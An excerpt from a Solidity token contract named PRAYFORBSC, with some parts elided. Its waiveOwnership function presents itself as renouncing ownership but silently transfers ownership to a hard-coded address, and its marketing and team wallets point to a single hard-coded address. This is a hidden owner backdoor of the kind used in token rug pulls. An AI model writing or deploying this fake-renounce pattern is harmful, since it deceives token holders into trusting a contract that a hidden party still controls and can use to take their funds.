...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x4d8d8bB68323153C20B7885E4654693F00fdf0E0));
        _owner = address(0x4d8d8bB68323153C20B7885E4654693F00fdf0E0);
    }
...
contract PRAYFORBSC is Context, IERC20, Ownable {
    ...
    string private _symbol = "PRAYBSC";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xdcC93EAcFc5D1D3D6D9649d7C4A063796317Bc75);
    address payable public teamWalletAddress = payable(0xdcC93EAcFc5D1D3D6D9649d7C4A063796317Bc75);
